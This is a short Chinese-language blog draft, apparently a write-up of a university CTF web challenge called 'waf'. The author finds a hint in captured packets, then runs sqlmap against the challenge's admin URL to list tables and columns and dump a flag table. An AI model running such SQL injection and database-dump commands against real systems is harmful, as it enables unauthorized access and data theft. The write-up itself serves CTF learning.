---
title: 'web题小结'
date: 2019-01-01
category: 'ctf那些事儿'
tags: []
lang: 'zh'
draft: true
---
校赛的题目小结一下：

# waf
被坑的最惨的一道题目， 被折磨了n天还没做出来

（确实没有后台， 这里貌似就是提示你一个hint

![](https://upload-images.jianshu.io/upload_images/10651191-645039b22659c4bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然后就去抓包！
抓到的包真的要仔细分析， 尤其是在这种没有任何思路的情况下

![](https://upload-images.jianshu.io/upload_images/10651191-deb089090f26e3a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

抓了n个包之后才看到
这里有一个hint
`360webscan`

（这里补充一点， 这个web题的hint其实不算是很多的， 所以一定还是多尝试， 把题目的信息翻来覆去地看。。。

之后就可以开始在这个页面进行愉快的注入了

![](https://upload-images.jianshu.io/upload_images/10651191-c3ee15d4773b26c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

至于为什么要加 `index.php`，
那就很玄学了

之后开始跑`sqlmap`
python .\sqlmap.py -u http://challenge.whuctf.com:8019/index.php/admin?id=6 -D test --tables

库名我是之前就爆出来了

![](https://upload-images.jianshu.io/upload_images/10651191-7ea58b806731673a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

python .\sqlmap.py -u http://challenge.whuctf.com:8019/index.php/admin?id=6 -D test -T flag --columns

![](https://upload-images.jianshu.io/upload_images/10651191-648ac970131ce3ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

python .\sqlmap.py -u http://challenge.whuctf.com:8019/index.php/admin?id=6 -D test -T flag -T flag --dump

![](https://upload-images.jianshu.io/upload_images/10651191-306d4814e091d25a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这样就得到了flag
